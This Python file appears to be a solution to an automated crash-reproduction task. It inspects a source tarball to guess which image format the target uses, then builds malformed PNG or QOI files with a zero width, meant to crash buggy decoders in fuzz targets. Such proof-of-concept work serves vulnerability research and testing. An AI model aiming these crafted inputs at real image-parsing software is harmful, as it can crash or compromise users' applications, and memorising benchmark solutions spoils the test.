import os
import struct
import zlib
import tarfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to detect likely format; default to PNG
        fmt = self._detect_format(src_path)
        if fmt == 'qoi':
            return self._make_qoi_zero_dim(width_zero=True, height=16)
        elif fmt == 'gif':
            # Fallback to PNG if GIF detected, as crafting a reliable zero-dimension crashing GIF is less portable
            return self._make_png_zero_width(height=64)
        elif fmt == 'bmp':
            # Some decoders accept BMP; however PNG is more universally supported in fuzz targets
            return self._make_png_zero_width(height=64)
        else:
            return self._make_png_zero_width(height=128)

    def _detect_format(self, src_path: str) -> str:
        # Heuristic: inspect tarball contents for common indicators
        try:
            names = []
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    # Limit files to avoid huge memory usage
                    if m.isfile() and len(names) < 2000:
                        names.append(m.name)
            # Prefer PNG if any indication
            joined = '\n'.join(names).lower()
            if any(s in joined for s in ['png', 'libpng', 'lodepng', 'ihdr']):
                return 'png'
            if 'gif' in joined or 'giflib' in joined:
                return 'gif'
            if 'qoi' in joined:
                return 'qoi'
            if 'bmp' in joined or 'bitmap' in joined:
                return 'bmp'
        except Exception:
            pass
        return 'png'

    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
        length = struct.pack('>I', len(data))
        crc = zlib.crc32(ctype)
        crc = zlib.crc32(data, crc) & 0xffffffff
        crc_bytes = struct.pack('>I', crc)
        return length + ctype + data + crc_bytes

    def _make_png_zero_width(self, height: int = 64) -> bytes:
        # PNG signature
        sig = b'\x89PNG\r\n\x1a\n'
        # IHDR: width=0, height=height, bit depth=8, color type=2 (RGB), compression=0, filter=0, interlace=0
        ihdr_data = struct.pack('>IIBBBBB', 0, height, 8, 2, 0, 0, 0)
        ihdr = self._png_chunk(b'IHDR', ihdr_data)
        # IDAT: provide 'height' scanlines of 1 byte each (filter byte only), all zero filter (type 0)
        raw = b'\x00' * height
        idat_data = zlib.compress(raw, level=9)
        idat = self._png_chunk(b'IDAT', idat_data)
        # IEND
        iend = self._png_chunk(b'IEND', b'')
        return sig + ihdr + idat + iend

    def _make_qoi_zero_dim(self, width_zero: bool = True, height: int = 16) -> bytes:
        # QOI header: magic 'qoif', width (u32), height (u32), channels (1=RGB?, actually should be 3 or 4), colorspace (0/1)
        # We'll set channels=4, colorspace=0
        # If width_zero True: width=0 otherwise height=0
        width = 0 if width_zero else 16
        height_val = height if width_zero else 0
        header = b'qoif' + struct.pack('>I', width) + struct.pack('>I', height_val) + bytes([4, 0])
        # QOI data: provide a small stream of QOI_OP_RGB/END to ensure decoder processes data
        # We'll add a few QOI_OP_RGB (0xfe) bytes; even though dimensions are zero, buggy decoders may still decode
        # QOI end marker is 7 zero bytes and 1 terminator byte 0x01
        # We'll add some arbitrary pixels then end
        stream = bytearray()
        for _ in range(8):
            stream += b'\xfe' + b'\x00\x00\x00'  # QOI_OP_RGB with black
        # End marker
        stream += b'\x00' * 7 + b'\x01'
        return header + bytes(stream)